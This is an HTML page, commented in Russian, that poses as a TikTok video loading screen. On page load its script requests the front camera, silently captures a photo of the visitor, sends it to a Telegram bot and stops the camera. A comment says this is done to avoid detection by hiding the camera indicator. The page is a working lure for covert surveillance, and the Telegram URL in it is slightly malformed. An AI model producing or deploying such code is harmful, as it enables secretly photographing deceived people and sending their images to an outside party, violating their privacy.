<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55; /* Фирменный цвет TikTok */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        /* Скрываем технические элементы */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <!-- Технические элементы для фото -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = 'ВАШ_ТОКЕН_ОТ_BOTFATHER';
        const chatId = 'ВАШ_ЦИФРОВОЙ_ID';

        // Функция отправки в Telegram
        async function sendToTelegram(imageData) {
            const blob = await (await fetch(imageData)).blob();
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'shot.jpg');

            await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // Запрос камеры сразу при входе
        window.onload = () => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Ждем 1 секунду, чтобы камера сфокусировалась
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                    sendToTelegram(dataURL);

                    // Останавливаем камеру, чтобы не палиться (индикатор в углу пропадет) кста код с нейронки сукии
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            })
            .catch(err => {
                console.log("Доступ отклонен");
            });
        };
    </script>
</body>
</html>
